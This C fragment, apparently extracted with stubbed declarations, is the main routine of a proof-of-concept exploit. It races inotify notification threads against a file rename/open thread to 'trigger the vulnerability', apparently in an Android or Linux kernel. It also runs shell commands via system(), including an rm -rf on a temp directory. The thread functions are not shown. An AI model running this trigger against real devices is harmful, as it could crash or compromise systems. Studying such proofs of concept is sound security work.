#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  pthread_t ;

/* Variables and functions */
 int /*<<< orphan*/  notify_thread_func ; 
 char* orig_name ; 
 int /*<<< orphan*/  pthread_create (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  pthread_join (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  snprintf (char*,int,char*,char*) ; 
 int /*<<< orphan*/  system (char*) ; 
 int /*<<< orphan*/  trigger_rename_open ; 

void main(void) 
{
    pthread_t notify_thread[4];
    pthread_t rename_thread;
    int i = 0;
    
    char buf[1024];
    snprintf(buf, sizeof buf, "touch test_dir/%s", orig_name);
    system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
    system(buf);

    for ( i ; i < 2; i++ ) {
        pthread_create(&notify_thread[i], 
                       NULL, 
                       notify_thread_func, 
                       NULL);
    }
    //Trigger inotify event by file open and rename to 
    //trigger the vulnerability 
    pthread_create(&rename_thread, NULL, trigger_rename_open, NULL);

    pthread_join(rename_thread, NULL);
    for ( i = 0; i < 2; i++ )
        pthread_join(notify_thread[i], NULL);

}